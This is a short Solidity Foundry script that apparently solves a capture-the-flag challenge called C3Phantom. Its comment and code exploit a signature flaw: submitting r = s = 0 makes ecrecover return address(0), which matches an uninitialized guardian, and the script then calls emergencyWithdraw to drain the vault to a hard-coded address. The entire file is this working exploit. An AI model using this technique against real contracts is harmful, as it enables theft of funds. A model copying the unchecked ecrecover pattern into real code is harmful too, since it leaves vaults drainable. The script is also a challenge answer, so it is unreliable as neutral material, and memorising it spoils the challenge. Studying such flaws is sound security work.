// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import "../Cheats.sol";
import "../../src/C3Phantom.sol";

/// Submit a malformed signature (r = s = 0); ecrecover returns address(0),
/// which equals the uninitialized guardian — the check passes, and you drain.
contract SolveC3 is Script {
    address constant ME = 0x70997970C51812dc3A010C7d01b50e0d17dc79C8;

    function run() external {
        GuardedVault vault = PhantomSetup(vm.envAddress("SETUP")).vault();
        vm.startBroadcast();
        vault.emergencyWithdraw(ME, 27, bytes32(0), bytes32(0));
        vm.stopBroadcast();
    }
}
